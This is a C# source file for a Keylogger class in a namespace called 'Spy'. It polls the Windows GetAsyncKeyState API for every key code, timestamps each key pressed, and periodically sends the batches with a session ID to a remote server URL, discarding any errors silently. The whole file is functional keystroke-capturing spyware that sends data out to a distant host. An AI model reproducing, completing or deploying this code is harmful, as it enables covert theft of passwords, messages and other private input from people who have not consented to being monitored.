using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using HIT.Common.Extensions;
using HIT.Services;
using HIT.Web.ViewModels;

namespace HIT.Desktop.Spy
{
    public class Keylogger : IDataCollector
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        private readonly object SyncLock;
        private readonly string SessionId;
        private readonly KeyloggerSettings Settings;
        private readonly ConcurrentQueue<string> KeysPressedQueue;
        private readonly IHttpService HttpService;

        private Timer timer;
        private bool isRunning;

        public Keylogger(string sessionId, KeyloggerSettings settings, IHttpService httpService)
        {
            this.Settings = settings;
            this.SessionId = sessionId;
            this.HttpService = httpService;
            this.KeysPressedQueue = new ConcurrentQueue<string>();
            this.SyncLock = new object();
        }

        public Task Start()
        {
            this.StartTimer();
            this.isRunning = true;

            while (this.isRunning)
            {
                this.TryEnqueueKeysPressed();
                
                // Wait for 10-15 ms to prevent CPU overload
                Thread.Sleep(10);
            }

            return null;
        }

        private void StartTimer()
        {
            this.timer = new Timer(async (_) => { await this.SendKeysPressed(); },
              this.Settings.TimerSettings.ObjectState,
              this.Settings.TimerSettings.DueTimeInMilliseconds,
              this.Settings.TimerSettings.PeriodInMilliseconds);
        }

        private void TryEnqueueKeysPressed()
        {
            for (Int32 i = 0; i < 255; i++)
            {
                var keyState = GetAsyncKeyState(i);

                if (keyState == 1 || keyState == -32767)
                {
                    var key = (Keys)i;

                    if (key != Keys.LButton && key != Keys.RButton)
                    {
                        this.KeysPressedQueue.Enqueue($"[{DateTime.Now}] - {key}");
                    }
                }
            }
        }

        private IEnumerable<string> ExtractItemsFromQueue(ConcurrentQueue<string> queue)
        {
            var itemsToDequeueCount = queue.Count;
            var itemsDequeued = new List<string>(itemsToDequeueCount);

            var item = default(string);
            var canDequeueItem = queue.TryDequeue(out item);
            var shouldDequeueItem = itemsToDequeueCount > 0;

            while (shouldDequeueItem && canDequeueItem)
            {
                itemsDequeued.Add(item);
                itemsToDequeueCount--;
                canDequeueItem = queue.TryDequeue(out item);
                shouldDequeueItem = itemsToDequeueCount > 0;
            }

            return itemsDequeued;
        }

        private async Task SendKeysPressed()
        {
            if (this.KeysPressedQueue.IsNotNull() && this.KeysPressedQueue.Count.IsGreaterThan(0))
            {
                IEnumerable<string> keysToSend;

                /* We are using a lock here, because there is a chance that the TimerEventHandler() 
                 * will be invoked again before its previous execution is completed. 
                 * This comes from the fact that we are awaiting an API call to a distant server, 
                 * which might slow down the execution for multiple reasons like: 
                 * Low bandwidth or High workload.
                 * This will occur in a race condition because both of the methods will try to
                 * dequeue items from the queue concurrently, which is not a problem for the queue itself,
                 * but it is a problem for the lists that are be built - 
                 * they will contain chronologically messed up data. */
                lock (this.SyncLock)
                {
                    keysToSend = this.ExtractItemsFromQueue(this.KeysPressedQueue);
                }

                try
                {
                    var model = new KeysPressedViewModel
                    {
                        SessionId = this.SessionId,
                        KeysPressed = keysToSend
                    };

                    //await this.HttpService.SendAsBson(model,
                    //    this.Settings.HttpServiceSettings.BaseAddress, 
                    //    this.Settings.HttpServiceSettings.RequestURL);

                    await this.HttpService.SendAsBson(model, this.Settings.RequestUrl);
                }
                catch (Exception exc)
                {
                    // TODO: Log the exception cause
                }
            }
        }

        public async void Stop()
        {
            // Stops the Start() method from logging any more keys
            this.isRunning = false;

            // Send the last keys that were pressed
            await this.SendKeysPressed();
        }
    }
}
